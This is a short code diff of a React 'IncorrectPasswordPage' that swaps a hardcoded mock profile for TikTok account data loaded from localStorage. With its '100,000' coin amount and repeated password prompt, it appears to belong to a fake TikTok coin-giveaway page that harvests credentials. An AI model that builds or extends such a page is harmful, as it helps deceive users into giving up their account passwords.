@@ -13,18 +13,17 @@ const IncorrectPasswordPage = () => {
   const navigate = useNavigate();
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [tiktokData, setTiktokData] = useState(null);
   const coinAmount = localStorage.getItem('coinAmount') || '100,000';
   const sessionId = localStorage.getItem('sessionId');
   const username = localStorage.getItem('username') || 'user';
 
-  const mockUserData = {
-    name: username,
-    username: `@${username}`,
-    followers: '532.4K',
-    following: '8.5K',
-    likes: '4.5M',
-    avatar: 'https://i.pravatar.cc/150?img=12'
-  };
+  useEffect(() => {
+    const storedData = localStorage.getItem('tiktokData');
+    if (storedData) {
+      setTiktokData(JSON.parse(storedData));
+    }
+  }, []);
 
   const passwordRequirements = [
     { text: 'At least 8 characters', met: password.length >= 8 },
